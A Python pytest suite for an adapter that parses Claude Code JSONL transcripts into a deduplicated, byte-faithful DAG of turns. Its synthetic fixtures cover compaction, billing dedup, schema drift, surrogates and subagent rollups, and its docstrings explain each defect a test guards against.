"""One test per DESIGN.md §2.2 trap. Each was found by recon on real transcripts.

Fixtures are synthetic or third-party (claude-code-log, MIT). This machine's
own history is never read — see DESIGN.md §3.
"""

from __future__ import annotations

import hashlib
import json
import os
import pathlib
import subprocess
import sys

import pytest
from conformance import check_adapter

from gitmemory.adapters import claude_code as cc
from gitmemory.adapters.claude_code import billable_usage
from gitmemory.records import Block, Turn


def write(tmp_path, name, lines) -> str:
    """Write JSONL from dicts, or raw bytes for the malformed cases."""
    p = tmp_path / name
    if isinstance(lines, bytes):
        p.write_bytes(lines)
    else:
        p.write_text("".join(json.dumps(x) + "\n" for x in lines))
    return str(p)


def user(uuid, text, **kw):
    return {
        "type": "user",
        "uuid": uuid,
        "sessionId": "s1",
        "message": {"role": "user", "content": text},
        **kw,
    }


def assistant(uuid, text, **kw):
    return {
        "type": "assistant",
        "uuid": uuid,
        "sessionId": "s1",
        "message": {"role": "assistant", "content": [{"type": "text", "text": text}]},
        **kw,
    }


# --- Trap: parentUuid is null at every compact_boundary --------------------


def test_logical_parent_survives_compaction(tmp_path):
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            user("u1", "hello"),
            {
                "type": "system",
                "subtype": "compact_boundary",
                "sessionId": "s1",
                "parentUuid": None,
                "compactMetadata": {"trigger": "manual"},
            },
            user("u2", "after", parentUuid=None, logicalParentUuid="u1", isCompactSummary=True),
        ],
    )
    s = check_adapter(cc, path)
    after = next(t for t in s.turns if t.uuid == "u2")
    assert after.parent_uuid == "u1", "fell back to null instead of logicalParentUuid"
    kinds = [e.kind for e in s.events]
    assert "compaction" in kinds and "fork" in kinds


# --- Trap: usage over-counts 2.79x; <synthetic> rows are not billable ------


def test_usage_dedups_by_request_id(tmp_path):
    # One logical response, three content blocks, cumulative usage repeated.
    cumulative = {"input_tokens": 100, "output_tokens": 50}
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            assistant("a1", "part one", requestId="req_1", message_usage=None),
            assistant("a2", "part two", requestId="req_1"),
            assistant("a3", "part three", requestId="req_1"),
            assistant("a4", "other turn", requestId="req_2"),
        ],
    )
    # inject usage into each assistant line
    lines = [json.loads(x) for x in pathlib.Path(path).read_text().splitlines()]
    for ln in lines:
        ln["message"]["usage"] = dict(cumulative)
        ln["message"]["model"] = "claude-opus-5"
    write(tmp_path, "s1.jsonl", lines)

    s = cc.parse(path)
    naive = sum(t.usage.get("input_tokens", 0) for t in s.turns)
    assert naive == 400, "fixture should over-count if summed naively"
    assert billable_usage(s)["input_tokens"] == 200, "did not dedup by request_id"


def test_synthetic_model_rows_are_not_billed(tmp_path):
    path = write(tmp_path, "s1.jsonl", [assistant("a1", "x", requestId="r1")])
    lines = [json.loads(x) for x in pathlib.Path(path).read_text().splitlines()]
    lines[0]["message"]["model"] = "<synthetic>"
    lines[0]["message"]["usage"] = {"input_tokens": 999}
    write(tmp_path, "s1.jsonl", lines)
    assert billable_usage(cc.parse(path)) == {}


# --- Trap: sessionId is not a stable conversation key ----------------------


def test_duplicate_uuid_is_deduped_and_counted(tmp_path):
    path = write(tmp_path, "s1.jsonl", [user("u1", "a"), user("u1", "a"), user("u2", "b")])
    s = check_adapter(cc, path)
    assert len(s.turns) == 2
    assert s.skipped["duplicate_uuid"] == 1, "dedup must be counted, not silent"


# --- Trap: schema drift; every field optional, never KeyError --------------


def test_snake_case_session_id_and_missing_fields(tmp_path):
    # The filename must NOT be the answer: with an `s1.jsonl` fixture the
    # basename fallback returns "s1" too, so the assertion below passed even
    # when `session_id` was ignored entirely.
    path = write(
        tmp_path,
        "not-the-session-id.jsonl",
        [
            {"type": "user", "session_id": "s1", "message": {"content": "no uuid, no ts"}},
            {"type": "assistant"},  # nothing at all
        ],
    )
    s = check_adapter(cc, path)
    assert s.session_id == "s1", "did not accept session_id as well as sessionId"
    assert len(s.turns) == 2 and s.turns[1].blocks == []


def test_unknown_line_type_is_counted_not_dropped(tmp_path):
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            user("u1", "a"),
            {"type": "some-future-thing", "sessionId": "s1"},
            {"type": "custom-title", "customTitle": "x"},
        ],
    )
    s = check_adapter(cc, path)
    assert s.skipped["no_identity:some-future-thing"] == 1
    assert s.skipped["skip:custom-title"] == 1, "known-internal types get their own counter"


def test_future_line_type_with_a_uuid_is_kept_not_dropped(tmp_path):
    """The allowlist failure mode: a new DAG-participating type must survive."""
    exotic = {
        "type": "some-future-thing",
        "uuid": "f1",
        "sessionId": "s1",
        "parentUuid": "u1",
        "payload": {"deep": [1, 2]},
    }
    path = write(tmp_path, "s1.jsonl", [user("u1", "a"), exotic])
    s = check_adapter(cc, path)
    assert len(s.turns) == 2, "dropped a line carrying a uuid"
    kept = s.turns[1]
    assert kept.role == "system" and kept.parent_uuid == "u1"
    assert kept.native == exotic, "native payload lost"


def test_attachment_and_progress_lines_are_kept(tmp_path):
    """Both carry uuid+parentUuid in the real corpus; both are DAG nodes."""
    lines = [
        user("u1", "a"),
        {
            "type": "attachment",
            "uuid": "at1",
            "sessionId": "s1",
            "parentUuid": "u1",
            "attachment": {"kind": "file"},
        },
        {
            "type": "progress",
            "uuid": "pr1",
            "sessionId": "s1",
            "parentUuid": None,
            "toolUseID": "t9",
            "data": {"pct": 50},
        },
    ]
    s = check_adapter(cc, path := write(tmp_path, "s1.jsonl", lines))
    assert [t.uuid for t in s.turns] == ["u1", "at1", "pr1"]
    assert s.turns[2].anchor_uuid == "t9"
    assert path  # keeps ruff quiet about the walrus


def test_summary_line_keeps_its_prose(tmp_path):
    path = write(
        tmp_path,
        "s1.jsonl",
        [{"type": "summary", "summary": "we chose sqlite", "leafUuid": "u9", "sessionId": "s1"}],
    )
    s = check_adapter(cc, path)
    assert s.turns[0].blocks[0].text == "we chose sqlite"


# --- Trap: never stringify an unknown block into text ----------------------


def test_unknown_block_keeps_native_and_never_reprs(tmp_path):
    exotic = {"type": "server_tool_use", "id": "srv1", "name": "web_search", "input": {"q": "x"}}
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            {
                "type": "assistant",
                "uuid": "a1",
                "sessionId": "s1",
                "message": {"role": "assistant", "content": [exotic]},
            }
        ],
    )
    s = check_adapter(cc, path)
    block = s.turns[0].blocks[0]
    assert block.native == exotic, "native payload lost"
    # Searchable AND recoverable: valid JSON, never a Python repr. Empty text
    # would hide a secret or an error string inside an unrecognised block.
    assert json.loads(block.text) == exotic, f"not re-parseable JSON: {block.text!r}"
    assert "'" not in block.text, "a Python repr leaked into a text field"
    assert "web_search" in block.text, "unknown block is not searchable"


def test_tool_result_dict_content_is_not_reprd(tmp_path):
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            {
                "type": "user",
                "uuid": "u1",
                "sessionId": "s1",
                "message": {
                    "role": "user",
                    "content": [
                        {"type": "tool_result", "tool_use_id": "t1", "content": {"foo": "bar"}}
                    ],
                },
            }
        ],
    )
    s = check_adapter(cc, path)
    text = s.turns[0].blocks[0].text
    assert text == "foo: bar", f"expected flattened text, got {text!r}"
    assert not text.startswith("{"), "Python repr leaked"


# --- Trap: six line types have no timestamp; byte order is the only order --


def test_out_of_order_timestamps_do_not_reorder(tmp_path):
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            user("u1", "first", timestamp="2026-09-20T10:00:00Z"),
            user("u2", "second", timestamp="2026-01-01T00:00:00Z"),  # earlier clock, later byte
            user("u3", "third"),  # no timestamp at all
        ],
    )
    s = check_adapter(cc, path)
    assert [t.uuid for t in s.turns] == ["u1", "u2", "u3"], "sorted by timestamp somewhere"


# --- Trap: sidechain interleaving anchors on toolUseId, not time -----------


def test_sidechain_anchors_on_tool_use_not_time(tmp_path):
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            assistant("a1", "spawning"),
            user(
                "u2",
                "subagent work",
                isSidechain=True,
                sourceToolAssistantUUID="a1",
                timestamp="2020-01-01T00:00:00Z",
            ),
        ],
    )
    s = check_adapter(cc, path)
    sub = s.turns[1]
    assert sub.is_sidechain and sub.anchor_uuid == "a1"


# --- Trap: worktrees move the project dir; glob, never compute the path ----


def test_find_session_globs_and_prefers_newest(tmp_path):
    root = tmp_path / "projects"
    for i, proj in enumerate(("-Users-x-work", "-Users-x-work-wt")):
        d = root / proj
        d.mkdir(parents=True)
        f = d / "abc-123.jsonl"
        f.write_text("{}\n")
        os.utime(f, (1000 + i * 1000, 1000 + i * 1000))
    found = cc.find_session("abc-123", str(root))
    assert found is not None and found.endswith("-Users-x-work-wt/abc-123.jsonl")
    assert cc.find_session("nope", str(root)) is None


# --- jsonl.py vendored behaviour: the two things a rewrite gets wrong ------


def test_concatenated_objects_on_one_line(tmp_path):
    raw = (json.dumps(user("u1", "a")) + json.dumps(user("u2", "b")) + "\n").encode()
    path = write(tmp_path, "s1.jsonl", raw)
    s = check_adapter(cc, path)
    assert [t.uuid for t in s.turns] == ["u1", "u2"], "lost an object sharing a physical line"
    assert s.turns[0].byte_offset == 0
    assert s.turns[1].byte_offset == len(json.dumps(user("u1", "a")))


def test_multibyte_before_a_second_object_on_the_same_line(tmp_path):
    """The offset of the *second* object has to count bytes, not characters.

    Every other offset test puts multi-byte text on a line of its own, where
    the line start alone carries the offset. Only a second object on the same
    line makes the within-line cursor observable — and that cursor is now
    carried rather than recomputed, so a character count here reads as a
    plausible offset that addresses the middle of a UTF-8 sequence. [E3]
    """
    raw = (
        json.dumps(user("u1", "ƒƒƒ"), ensure_ascii=False) + json.dumps(user("u2", "b")) + "\n"
    ).encode()
    s = check_adapter(cc, write(tmp_path, "s1.jsonl", raw))  # re-reads each span from disk

    assert [t.uuid for t in s.turns] == ["u1", "u2"]
    assert s.turns[1].byte_offset == raw.index(b'{"type": "user", "uuid": "u2"')


def test_invalid_utf8_keeps_byte_true_offsets(tmp_path):
    bad = json.dumps(user("u1", "PLACEHOLDER")).replace("PLACEHOLDER", "caf\\u00e9")
    raw = bad.encode() + b"\n" + json.dumps(user("u2", "next")).encode() + b"\n"
    raw = raw.replace(b"caf\\u00e9", b"caf\xe9")  # a raw latin-1 byte: invalid UTF-8
    path = write(tmp_path, "s1.jsonl", raw)
    s = check_adapter(cc, path)  # _spans_are_real re-reads each span from disk
    assert len(s.turns) == 2
    assert s.turns[1].byte_offset == raw.index(b'{"type": "user", "uuid": "u2"')


def test_truncated_final_line_is_counted(tmp_path):
    raw = json.dumps(user("u1", "ok")).encode() + b"\n" + b'{"type":"user","uuid":"u2"'
    path = write(tmp_path, "s1.jsonl", raw)
    s = check_adapter(cc, path)
    assert len(s.turns) == 1
    assert s.skipped["json_decode_error"] == 1, "a torn tail must be reported, not swallowed"


# --- Determinism across the whole corpus ----------------------------------


def _corpus() -> list[str]:
    root = os.environ.get("GITMEMORY_CC_FIXTURES", "/tmp/gm-e0/claude-code-log/test/test_data")
    if not os.path.isdir(root):
        return []
    return sorted(str(p) for p in pathlib.Path(root).rglob("*.jsonl"))


@pytest.mark.parametrize("path", _corpus())
def test_third_party_corpus(path):
    """claude-code-log's 162 MIT fixtures. Not this machine's history."""
    check_adapter(cc, path)


def test_corpus_is_present_or_explicitly_absent():
    """A missing corpus is a green CI run that tested almost nothing.

    Locally a skip is right — not everyone has fetched the fixtures. Anywhere
    that must not silently lose 162 cases sets GITMEMORY_REQUIRE_CORPUS=1 and
    this becomes a failure.
    """
    if _corpus():
        return
    msg = "third-party corpus missing; run tests/fetch_fixtures.sh"
    if os.environ.get("GITMEMORY_REQUIRE_CORPUS") == "1":
        raise AssertionError(msg)
    pytest.skip(msg)


# --- Review round 1 (Gemini pair-review): id stability and DAG integrity ---


def test_turn_ids_survive_a_skip_rule_change(tmp_path):
    """The churn trap: ids must not be a function of a counter over kept lines.

    A line we skip today may be a line we keep tomorrow (the identity rule in
    this adapter already changed once). If `seq` were in `turn_id`, adding or
    removing one skipped line would renumber every later turn and rewrite the
    whole committed tree — the exact churn this project exists to prevent.
    """
    convo = [user("u1", "a"), assistant("a1", "b"), user("u2", "c")]
    before = cc.parse(write(tmp_path, "s1.jsonl", convo))
    # `attachment` was dropped by this adapter yesterday and is kept today.
    # That rule change must not rewrite the ids of the turns around it.
    now_kept = {
        "type": "attachment",
        "uuid": "at1",
        "sessionId": "s1",
        "parentUuid": "u1",
        "attachment": {"kind": "file"},
    }
    after = cc.parse(write(tmp_path, "s2.jsonl", [convo[0], now_kept, convo[1], convo[2]]))

    unchanged = [t for t in after.turns if t.uuid != "at1"]
    assert [t.seq for t in unchanged] == [0, 2, 3], "fixture does not renumber; it proves nothing"
    assert [t.turn_id for t in before.turns] == [t.turn_id for t in unchanged], (
        "a newly-kept line renumbered its neighbours — every later tree object would churn"
    )


def test_turn_id_changes_when_content_changes(tmp_path):
    """The other half: the same uuid with different bytes must NOT collide."""
    a = cc.parse(write(tmp_path, "a.jsonl", [user("u1", "original")]))
    b = cc.parse(write(tmp_path, "b.jsonl", [user("u1", "rewritten")]))
    assert a.turns[0].turn_id != b.turns[0].turn_id, "a rewrite would be invisible in the diff"


def test_parent_uuids_resolve_within_the_session(tmp_path):
    """A DAG with dangling edges is broken memory. Roots are legitimate; strays are not."""
    path = write(
        tmp_path,
        "s1.jsonl",
        [user("u1", "a"), assistant("a1", "b", parentUuid="u1"), user("u2", "c", parentUuid="a1")],
    )
    s = check_adapter(cc, path)
    known = {t.uuid for t in s.turns if t.uuid}
    dangling = [t.uuid for t in s.turns if t.parent_uuid and t.parent_uuid not in known]
    assert dangling == [], f"parent_uuid points outside the session: {dangling}"


def test_canonical_output_survives_lone_surrogates(tmp_path):
    """Byte fidelity means text may hold lone surrogates. Our own path must not crash."""
    raw = json.dumps(user("u1", "X")).encode().replace(b'"X"', b'"caf\xe9"') + b"\n"
    s = check_adapter(cc, write(tmp_path, "s1.jsonl", raw))
    blob = s.to_canonical()  # must not raise UnicodeEncodeError
    assert blob.decode("utf-8", "surrogateescape")
    assert s.turns[0].blocks[0].content_sha256, "hashing a surrogate-bearing block failed"


@pytest.mark.parametrize("path", _corpus())
def test_canonical_output_has_no_floats(path):
    """Floats are the one JSON type whose text form is language-dependent.

    This is an observation about the corpus, not a guarantee about the code,
    and the docstring used to say the opposite: "they never reach the manifest
    by construction". They do. `_scrub` passes finite floats through and
    `canonical_json` accepts them by design — `{"usage": {"ratio": 0.25}}` on
    one line puts a float at `.turns[0].usage.ratio` in canonical output, which
    `test_a_float_from_a_transcript_does_reach_canonical_output` now pins.

    So what this test measures is that no real transcript has yet exercised
    that path. That is worth knowing and worth watching: if floats start
    appearing in real input, the cross-language story needs revising rather
    than silently drifting. It is not worth claiming as an invariant.
    [E7 parsing-F8]
    """
    doc = json.loads(cc.parse(path).to_canonical().decode("utf-8", "surrogateescape"))
    stack = [doc]
    while stack:
        node = stack.pop()
        if isinstance(node, float):
            raise AssertionError(f"float reached canonical output in {path}")
        if isinstance(node, dict):
            stack.extend(node.values())
        elif isinstance(node, list):
            stack.extend(node)


# --- Review round 2: the 35 confirmed findings of the six-lens review ------
#
# Every test below reproduces a defect that shipped in E1 and was found by the
# standalone review round, not by the tests written alongside the code. They
# are grouped by what the defect cost: a crash, lost content, or a wrong id.


# Crashes on input a real transcript can contain.


def test_lone_high_surrogate_does_not_abort_the_parse(tmp_path):
    r"""`\ud800` is legal JSON and decodes to a lone *high* surrogate.

    JavaScript emits one whenever a tool result is sliced mid-pair, so this is
    ordinary input, not an attack. `surrogateescape` only round-trips
    U+DC80-U+DCFF, so encoding with it raised UnicodeEncodeError and took the
    whole transcript down — one bad character lost every turn in the file.
    """
    raw = (
        json.dumps(user("u1", "PLACEHOLDER")).replace("PLACEHOLDER", r"a\ud800b")
        + "\n"
        + json.dumps(user("u2", "survivor"))
        + "\n"
    ).encode()
    s = check_adapter(cc, write(tmp_path, "s1.jsonl", raw))
    assert [t.uuid for t in s.turns] == ["u1", "u2"], "one surrogate lost the whole file"
    assert "\ud800" in s.turns[0].blocks[0].text, "the character itself must survive"


def test_canonical_json_is_ascii_and_reparses_after_surrogates(tmp_path):
    """Canonical JSON must be re-readable by our own reader.

    With ensure_ascii off, surrogateescape'd bytes passed straight through and
    the committed "canonical JSON" was not valid UTF-8 — unparseable by us and
    by `jq`, which is the whole third-party-checkability claim.

    The bad bytes go in `cwd`, not only in block text. The first version of this
    test put them solely in the text, and `to_canonical` emits `content_sha256`
    rather than the text — so the fixture's surrogates never reached the function
    under test, and `ensure_ascii=False` left the whole suite green. `cwd` is a
    field the canonical blob actually carries, and it is the realistic carrier:
    a project directory named from a Latin-1 shell puts one invalid byte in every
    record of the transcript. Same for `gitBranch`, `tool_name`, usage keys and
    `compactMetadata`. [E4, vacuity pass 2: L1]
    """
    line = json.dumps(user("u1", "X", cwd="Y", gitBranch="Z")).encode()
    raw = (
        line.replace(b'"X"', b'"caf\xe9\xff"')
        .replace(b'"Y"', b'"/tmp/caf\xe9"')
        .replace(b'"Z"', b'"br-\xff"')
    ) + b"\n"
    session = check_adapter(cc, write(tmp_path, "s1.jsonl", raw))
    assert "\udce9" in session.cwd, "the fixture never reached the field under test"

    blob = session.to_canonical()
    blob.decode("ascii")  # must not raise
    parsed = json.loads(blob)
    assert parsed["turns"], "our own reader cannot read what we committed"
    assert parsed["session"]["cwd"] == session.cwd, "the escaped path did not round-trip"
    assert parsed["session"]["git_branch"] == session.git_branch


@pytest.mark.parametrize(
    "line",
    [
        {"type": {"not": "a string"}, "uuid": "u1"},
        {"type": "user", "uuid": {"not": "a string"}},
        {"type": ["list"], "uuid": ["also a list"]},
        {"type": "user", "uuid": 17},
    ],
)
def test_non_string_type_or_uuid_is_counted_not_a_typeerror(tmp_path, line):
    """`line_type in SILENT_SKIP_TYPES` raised on an unhashable value.

    A single line with a dict `type` aborted the parse with TypeError, before
    the guard twenty lines further down that already handled the same value.
    """
    path = write(tmp_path, "s1.jsonl", [user("ok", "kept"), line])
    s = check_adapter(cc, path)
    assert any(t.uuid == "ok" for t in s.turns), "a malformed neighbour lost a good turn"


def test_deeply_nested_payload_does_not_recurse_to_death(tmp_path):
    """json.loads accepts structures deeper than a naive projection can walk."""
    deep = {"a": 1}
    for _ in range(600):
        deep = {"n": deep}
    line = {
        "type": "user",
        "uuid": "u1",
        "sessionId": "s1",
        "message": {"role": "user", "content": [{"type": "tool_use", "name": "T", "input": deep}]},
    }
    s = check_adapter(cc, write(tmp_path, "s1.jsonl", [line]))
    assert "nesting too deep" in s.turns[0].blocks[0].text


def test_non_finite_numbers_reach_canonical_json_as_text(tmp_path):
    """The reader accepts bare NaN; the writer rejects it. That gap was a crash.

    `json.JSONDecoder` parses `NaN`/`Infinity` by default, `canonical_json`
    sets allow_nan=False by design, so a transcript written by a Python
    harness raised ValueError at commit time — long after the parse that
    accepted it, and counted nowhere.
    """
    raw = (
        b'{"type":"assistant","uuid":"a1","sessionId":"s1","requestId":"r1",'
        b'"message":{"role":"assistant","model":"m","usage":{"input_tokens":NaN},'
        b'"content":[{"type":"text","text":"hi"}]}}\n'
    )
    s = check_adapter(cc, write(tmp_path, "s1.jsonl", raw))
    assert s.turns[0].usage["input_tokens"] == "nan", "NaN must become text, not a crash"
    assert cc.billable_usage(s) == {}, "a non-int token count must not be summed"


# Content that was silently lost.


def test_summary_survives_a_leafuuid_that_points_at_a_kept_turn(tmp_path):
    """`leafUuid` is a *pointer*; folding it into the identity namespace lost it.

    A summary line's leafUuid names the turn it summarises. Treating that as
    the summary's own uuid made it collide with that turn and lose the dedup
    race, so the summary was dropped and counted as `duplicate_uuid`. Measured:
    3 lost summaries on the MIT corpus, which read as correct dedup.
    """
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            user("u1", "the conversation"),
            {"type": "summary", "summary": "we decided X", "leafUuid": "u1"},
        ],
    )
    s = check_adapter(cc, path)
    assert s.skipped.get("duplicate_uuid", 0) == 0, "a pointer was mistaken for an identity"
    kept = [t for t in s.turns if (t.native or {}).get("type") == "summary"]
    assert len(kept) == 1 and "we decided X" in kept[0].blocks[0].text
    assert kept[0].ref_uuid == "u1" and kept[0].uuid is None


def test_compact_boundary_is_a_turn_as_well_as_an_event(tmp_path):
    """The boundary line carries a uuid and parents the summary that follows.

    Dropping it emitted the event but deleted the node, leaving the next turn's
    parent_uuid pointing at nothing and losing `compactMetadata` entirely.
    """
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            user("u1", "before"),
            {
                "type": "system",
                "subtype": "compact_boundary",
                "uuid": "cb1",
                "sessionId": "s1",
                "parentUuid": "u1",
                "compactMetadata": {"trigger": "auto", "preTokens": 150000},
            },
            user("u2", "after", parentUuid="cb1", isCompactSummary=True),
        ],
    )
    s = check_adapter(cc, path)
    known = {t.uuid for t in s.turns if t.uuid}
    assert "cb1" in known, "the boundary node was deleted from the DAG"
    assert [t.uuid for t in s.turns if t.parent_uuid and t.parent_uuid not in known] == []
    ev = next(e for e in s.events if e.kind == "compaction")
    assert ev.meta["compact_metadata"]["trigger"] == "auto", "compactMetadata was lost"


def test_system_and_attachment_prose_outside_message_is_indexed(tmp_path):
    """Text was read only from `message.content`, so most of it was invisible.

    On the MIT corpus that was 122 of 133 `system` lines and all 54
    `attachment` payloads producing zero searchable blocks.
    """
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            {
                "type": "system",
                "uuid": "s1a",
                "sessionId": "s1",
                "content": "Model changed to opus",
            },
            {
                "type": "attachment",
                "uuid": "at1",
                "sessionId": "s1",
                "attachment": {
                    "kind": "file",
                    "path": "notes.md",
                    "content": "the deploy key rotates on Fridays",
                },
            },
        ],
    )
    s = check_adapter(cc, path)
    text = " ".join(b.text for t in s.turns for b in t.blocks)
    assert "Model changed to opus" in text
    assert "rotates on Fridays" in text, "attachment payload never became searchable"


def test_queue_operation_remove_keeps_its_human_text(tmp_path):
    """`operation: remove` carries a real steering message; `dequeue` carries none."""
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            {
                "type": "queue-operation",
                "operation": "remove",
                "sessionId": "s1",
                "content": "actually - focus on the parser first",
            },
            {"type": "queue-operation", "operation": "dequeue", "sessionId": "s1"},
        ],
    )
    s = check_adapter(cc, path)
    assert len(s.turns) == 1, "kept a contentless marker, or dropped real prose"
    assert "focus on the parser first" in s.turns[0].blocks[0].text
    assert s.skipped["no_identity:queue-operation"] == 1


@pytest.mark.parametrize("size", [700, 50_000])
def test_image_payload_is_not_inlined_into_the_index(tmp_path, size):
    """Base64 was 61.7% of all indexed text on the corpus before this branch.

    The bytes stay in `native` and in the raw segment; what the index gets is
    that an image of a given type and size was here.

    Two sizes, because one was not enough. With only the 50,000-char payload,
    deleting the whole `image` branch left the suite green: the block fell
    through to the unknown-block path, where `_scrub`'s 1 KiB cap emitted
    `[50000 chars elided]` — a string that happens to contain both `image/png`
    and `50000`, so every assertion here passed by coincidence. A 700-char icon
    is *under* that cap, so with the branch gone it is inlined verbatim: 778
    chars of base64 straight into the index. Asserting the exact projection
    rather than substrings closes the coincidence at both sizes.
    [E4, vacuity pass 2: L2]
    """
    blob = "A" * size
    line = {
        "type": "user",
        "uuid": "u1",
        "sessionId": "s1",
        "message": {
            "role": "user",
            "content": [
                {
                    "type": "image",
                    "source": {"type": "base64", "media_type": "image/png", "data": blob},
                }
            ],
        },
    }
    s = check_adapter(cc, write(tmp_path, "s1.jsonl", [line]))
    b = s.turns[0].blocks[0]
    assert b.text == f"[image image/png {size} chars]"
    assert b.native["source"]["data"] == blob, "the payload must survive in native"


def test_a_long_string_in_an_unknown_block_is_elided_at_the_cap(tmp_path):
    """The cap itself, which nothing held down: `_ELIDE_OVER` could be anything.

    Raising it to a billion left all 784 tests green, because the only fixture
    with a payload big enough to trip it was the image one — and images never
    reach `_scrub`. This uses an unrecognised block, which does, and pins both
    sides of the boundary so the constant cannot drift in either direction.

    The sizes are literals, not `cc._ELIDE_OVER ± 1`. The first draft derived
    them from the constant, which made the test move with the mutant instead of
    failing on it: a cap of a billion just meant a billion-character fixture.
    A boundary test that reads the boundary it is checking tests nothing.
    [E4, vacuity pass 2: L2]
    """
    assert cc._ELIDE_OVER == 1024, "the sizes below are literals; change both together"
    over, under = "B" * 1025, "C" * 1024
    line = {
        "type": "user",
        "uuid": "u1",
        "sessionId": "s1",
        "message": {
            "role": "user",
            "content": [{"type": "unheard_of", "big": over, "small": under}],
        },
    }
    s = check_adapter(cc, write(tmp_path, "s1.jsonl", [line]))
    text = s.turns[0].blocks[0].text
    assert over not in text, "a payload past the cap was inlined"
    assert f"[{len(over)} chars elided]" in text, "the marker must say how much was dropped"
    assert under in text, "a payload at the cap must survive whole"
    assert s.turns[0].blocks[0].native["big"] == over, "the payload must survive in native"


def test_flatten_keeps_siblings_of_a_text_key(tmp_path):
    """The dict shortcut fired on any dict with a `text` key and dropped the rest."""
    line = {
        "type": "user",
        "uuid": "u1",
        "sessionId": "s1",
        "message": {
            "role": "user",
            "content": [
                {
                    "type": "tool_result",
                    "content": {
                        "text": "ok",
                        "exit_code": 137,
                        "stderr": "killed by the oom reaper",
                    },
                }
            ],
        },
    }
    s = check_adapter(cc, write(tmp_path, "s1.jsonl", [line]))
    text = s.turns[0].blocks[0].text
    assert "oom reaper" in text and "137" in text, "siblings of `text` were discarded"


# Wrong ids.


def test_session_id_is_resolved_before_any_id_is_computed(tmp_path):
    """Ids must not be keyed on the empty string.

    `sessionId` first appears on line 2 here. The old parser built line 1 with
    session_id="" and back-patched the attribute afterwards without recomputing
    the id, so the id stayed keyed on "" — identical across unrelated sessions,
    and not the documented function of its own fields.
    """
    a = check_adapter(
        cc,
        write(
            tmp_path,
            "a.jsonl",
            [
                {
                    "type": "user",
                    "uuid": "u1",
                    "message": {"role": "user", "content": "same words"},
                },
                user("u2", "later", sessionId="alpha"),
            ],
        ),
    )
    b = check_adapter(
        cc,
        write(
            tmp_path,
            "b.jsonl",
            [
                {
                    "type": "user",
                    "uuid": "u1",
                    "message": {"role": "user", "content": "same words"},
                },
                user("u2", "later", sessionId="beta"),
            ],
        ),
    )
    assert a.turns[0].session_id == "alpha" and b.turns[0].session_id == "beta"
    assert a.turns[0].turn_id != b.turns[0].turn_id, "two sessions minted the same turn_id"


def test_event_ids_do_not_move_when_a_skip_rule_changes(tmp_path):
    """`seq` was removed from turn_id for churn; Event kept it and churned anyway."""
    boundary = {
        "type": "system",
        "subtype": "compact_boundary",
        "uuid": "cb1",
        "sessionId": "s1",
        "parentUuid": None,
    }
    before = cc.parse(write(tmp_path, "a.jsonl", [user("u1", "x"), boundary]))
    with_extra = cc.parse(
        write(
            tmp_path,
            "b.jsonl",
            [
                user("u1", "x"),
                {"type": "attachment", "uuid": "at1", "sessionId": "s1", "attachment": {"k": 1}},
                boundary,
            ],
        )
    )
    assert before.events[0].event_id == with_extra.events[0].event_id, (
        "a newly-kept line renumbered an event id"
    )


def test_agent_id_and_tool_use_id_stay_in_their_own_namespaces(tmp_path):
    """`anchor_uuid` merged a turn uuid with a content-block id; joins went wrong."""
    path = write(
        tmp_path,
        "s1.jsonl",
        [
            assistant("a1", "spawn"),
            user(
                "u2",
                "sub",
                isSidechain=True,
                sourceToolAssistantUUID="a1",
                toolUseID="toolu_01",
                agentId="agent-xyz",
            ),
        ],
    )
    s = check_adapter(cc, path)
    sub = s.turns[1]
    assert sub.anchor_uuid == "a1", "a block id displaced the turn uuid"
    assert sub.agent_id == "agent-xyz", "agentId was never projected"


def test_skip_reason_keys_are_bounded(tmp_path):
    """Skip reasons key on an untrusted `type` and are written into git."""
    lines = [{"type": "x" * 5000, "sessionId": "s1"}]
    lines += [{"type": f"t{i}", "sessionId": "s1"} for i in range(200)]
    s = check_adapter(cc, write(tmp_path, "s1.jsonl", lines))
    assert all(len(k) <= 64 for k in s.skipped), "an untrusted string reached git unbounded"
    assert len(s.skipped) <= 66, "one file minted an unbounded number of counters"


# Block kinds that had no test at all.


def test_thinking_and_tool_use_blocks_are_projected(tmp_path):
    """Neither kind was covered; dropping either passed the whole E1 suite."""
    line = {
        "type": "assistant",
        "uuid": "a1",
        "sessionId": "s1",
        "requestId": "r1",
        "message": {
            "role": "assistant",
            "model": "claude-sonnet-4-5",
            "content": [
                {"type": "thinking", "thinking": "the lock is held across the await"},
                {
                    "type": "tool_use",
                    "id": "tu1",
                    "name": "Bash",
                    "input": {"command": "pytest -q"},
                },
                {"type": "tool_result", "tool_use_id": "tu1", "content": "12 passed"},
            ],
        },
    }
    s = check_adapter(cc, write(tmp_path, "s1.jsonl", [line]))
    kinds = [b.kind for b in s.turns[0].blocks]
    assert kinds == ["thinking", "tool_use", "tool_result"]
    assert "held across the await" in s.turns[0].blocks[0].text
    assert s.turns[0].blocks[1].tool_name == "Bash"
    assert "pytest -q" in s.turns[0].blocks[1].text
    assert "12 passed" in s.turns[0].blocks[2].text


# --- §2.2 traps that were listed as required and never implemented ---------


def billed(uuid, request_id, usage):
    """An assistant line whose usage is where Claude Code actually puts it."""
    line = assistant(uuid, "x", requestId=request_id)
    line["message"]["usage"] = usage
    line["message"]["model"] = "claude-sonnet-4-5"
    return json.dumps(line) + "\n"


def test_rollup_includes_subagents(tmp_path):
    """Subagents are 92% of files; one session kept 78% of cache reads in them."""
    main = tmp_path / "sess.jsonl"
    main.write_text(billed("a1", "r1", {"input_tokens": 10}))
    subs = tmp_path / "sess" / "subagents"
    subs.mkdir(parents=True)
    (subs / "agent-one.jsonl").write_text(billed("b1", "r2", {"cache_read_input_tokens": 900}))
    # A subagent that spawned its own subagent, nested one level deeper.
    deeper = subs / "agent-one" / "subagents"
    deeper.mkdir(parents=True)
    (deeper / "agent-two.jsonl").write_text(billed("c1", "r3", {"input_tokens": 5}))

    assert len(cc.session_files(str(main))) == 3, "a nested subagent was missed"
    assert cc.billable_usage(cc.parse(str(main))) == {"input_tokens": 10}
